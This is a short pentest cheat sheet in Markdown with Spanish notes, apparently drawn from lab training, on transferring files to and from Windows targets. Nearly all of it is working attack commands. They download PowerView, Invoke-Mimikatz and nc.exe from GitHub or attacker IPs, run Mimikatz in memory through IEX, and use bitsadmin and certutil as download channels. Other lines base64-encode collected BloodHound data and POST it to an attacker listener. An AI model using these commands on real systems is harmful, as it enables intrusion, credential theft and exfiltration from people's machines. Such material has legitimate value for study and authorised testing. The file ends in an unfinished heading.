# File Transfer - Powershell

## Powershell Downloads

- System.Net.WebClient


```powershell
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
```

- Invoke-WebRequest 

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```


- Directo en memoria con EX

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

- Con pipelne a iex

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
```

- En ocasiones la configuración de IE incial no esta completada, se puede pasar con:
  
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
Invoke-CheckLocalAdminAccess
```

- O se puede deshablitar desde el registro la configuración inicial de IE

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```

## Powershell Uploads

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```

```bash
nc -lnvp > base64
echo <base64> | base64 -d -w 0 > bloodhound.zip
```

## Bitsadmin

### Download

- cmd

```cmd
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

- powershell
  
```powershell
Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```

### Upload

```powershell
Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

## Certutil

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

```cmd
certutil -urlcache -f http://10.10.15.96/upload_win.zip upload_win.zip
```

## Al final de los tiempos

Si